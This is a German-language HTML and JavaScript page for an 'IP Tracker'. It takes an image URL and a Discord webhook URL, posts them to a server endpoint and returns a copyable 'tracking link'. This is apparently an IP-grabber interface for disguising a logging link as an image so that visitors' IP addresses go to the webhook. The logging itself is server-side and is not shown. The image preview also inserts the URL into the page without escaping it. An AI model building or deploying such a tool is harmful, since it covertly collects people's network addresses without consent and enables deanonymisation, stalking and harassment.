<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Tracker - Bild-Link Tracking</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 600px;
            width: 100%;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 2.5em;
            font-weight: 700;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .upload-area {
            border: 3px dashed #667eea;
            border-radius: 15px;
            padding: 40px;
            text-align: center;
            margin-bottom: 30px;
            background: rgba(102, 126, 234, 0.05);
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .upload-area:hover {
            border-color: #764ba2;
            background: rgba(118, 75, 162, 0.1);
            transform: translateY(-2px);
        }

        .upload-area.dragover {
            border-color: #764ba2;
            background: rgba(118, 75, 162, 0.2);
        }

        .upload-icon {
            font-size: 48px;
            color: #667eea;
            margin-bottom: 20px;
        }

        .upload-text {
            color: #666;
            font-size: 18px;
            margin-bottom: 10px;
        }

        .upload-subtext {
            color: #999;
            font-size: 14px;
        }

        .url-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            margin-bottom: 20px;
            transition: border-color 0.3s ease;
        }

        .url-input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .webhook-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            margin-bottom: 30px;
            transition: border-color 0.3s ease;
        }

        .webhook-input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .generate-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .generate-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .generate-btn:active {
            transform: translateY(0);
        }

        .generate-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .result-container {
            margin-top: 30px;
            padding: 25px;
            background: rgba(102, 126, 234, 0.1);
            border-radius: 15px;
            border: 1px solid rgba(102, 126, 234, 0.2);
            display: none;
        }

        .result-link {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
        }

        .result-link input {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            background: white;
        }

        .copy-btn {
            padding: 12px 20px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 14px;
        }

        .copy-btn:hover {
            background: #764ba2;
        }

        .message {
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 500;
        }

        .message.success {
            background: rgba(76, 175, 80, 0.1);
            color: #4caf50;
            border: 1px solid rgba(76, 175, 80, 0.3);
        }

        .message.error {
            background: rgba(244, 67, 54, 0.1);
            color: #f44336;
            border: 1px solid rgba(244, 67, 54, 0.3);
        }

        .loading {
            display: none;
            text-align: center;
            color: #667eea;
            font-weight: 500;
        }

        .preview {
            margin-top: 20px;
            text-align: center;
        }

        .preview img {
            max-width: 100%;
            max-height: 200px;
            border-radius: 10px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
        }

        @media (max-width: 768px) {
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 2em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 IP Tracker</h1>
        
        <div class="upload-area" id="uploadArea">
            <div class="upload-icon">🖼️</div>
            <div class="upload-text">Bild-Link hier eingeben</div>
            <div class="upload-subtext">Füge einen Link zu einem Bild ein</div>
        </div>

        <input type="url" id="imageUrl" class="url-input" placeholder="https://example.com/bild.jpg" required>
        
        <input type="url" id="webhookUrl" class="webhook-input" placeholder="Discord Webhook URL" required>
        
        <button id="generateBtn" class="generate-btn">🚀 Tracking-Link generieren</button>
        
        <div id="loading" class="loading">⏳ Wird generiert...</div>
        
        <div id="resultContainer" class="result-container">
            <div class="message success">✅ Tracking-Link erfolgreich erstellt!</div>
            <div class="result-link">
                <input type="text" id="trackingLink" readonly>
                <button id="copyBtn" class="copy-btn">📋 Kopieren</button>
            </div>
            <div class="preview" id="preview"></div>
        </div>
    </div>

    <script>
        const uploadArea = document.getElementById('uploadArea');
        const imageUrlInput = document.getElementById('imageUrl');
        const webhookUrlInput = document.getElementById('webhookUrl');
        const generateBtn = document.getElementById('generateBtn');
        const loading = document.getElementById('loading');
        const resultContainer = document.getElementById('resultContainer');
        const trackingLinkInput = document.getElementById('trackingLink');
        const copyBtn = document.getElementById('copyBtn');
        const preview = document.getElementById('preview');

        // URL-Validierung
        function isValidUrl(string) {
            try {
                new URL(string);
                return true;
            } catch (_) {
                return false;
            }
        }

        // Bild-Vorschau
        function showPreview(url) {
            if (isValidUrl(url)) {
                preview.innerHTML = `<img src="${url}" alt="Vorschau" onerror="this.style.display='none'">`;
            } else {
                preview.innerHTML = '';
            }
        }

        // Event Listener
        imageUrlInput.addEventListener('input', () => {
            showPreview(imageUrlInput.value);
        });

        uploadArea.addEventListener('click', () => {
            imageUrlInput.focus();
        });

        generateBtn.addEventListener('click', async () => {
            const imageUrl = imageUrlInput.value.trim();
            const webhookUrl = webhookUrlInput.value.trim();

            if (!imageUrl || !webhookUrl) {
                showMessage('Bitte füllen Sie alle Felder aus', 'error');
                return;
            }

            if (!isValidUrl(imageUrl)) {
                showMessage('Bitte geben Sie eine gültige Bild-URL ein', 'error');
                return;
            }

            if (!isValidUrl(webhookUrl)) {
                showMessage('Bitte geben Sie eine gültige Webhook-URL ein', 'error');
                return;
            }

            // UI State
            generateBtn.disabled = true;
            loading.style.display = 'block';
            resultContainer.style.display = 'none';

            try {
                const response = await fetch('/upload', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        image_url: imageUrl,
                        webhook_url: webhookUrl
                    })
                });

                const data = await response.json();

                if (data.success) {
                    trackingLinkInput.value = data.tracking_url;
                    resultContainer.style.display = 'block';
                    showMessage('Tracking-Link erfolgreich erstellt!', 'success');
                } else {
                    showMessage(data.error || 'Fehler bei der Erstellung', 'error');
                }
            } catch (error) {
                showMessage('Server-Fehler: ' + error.message, 'error');
            } finally {
                generateBtn.disabled = false;
                loading.style.display = 'none';
            }
        });

        copyBtn.addEventListener('click', () => {
            trackingLinkInput.select();
            document.execCommand('copy');
            copyBtn.textContent = '✅ Kopiert!';
            setTimeout(() => {
                copyBtn.textContent = '📋 Kopieren';
            }, 2000);
        });

        function showMessage(text, type) {
            const existingMessage = resultContainer.querySelector('.message');
            if (existingMessage) {
                existingMessage.remove();
            }
            
            const message = document.createElement('div');
            message.className = `message ${type}`;
            message.textContent = text;
            resultContainer.insertBefore(message, resultContainer.firstChild);
        }
    </script>
</body>
</html>
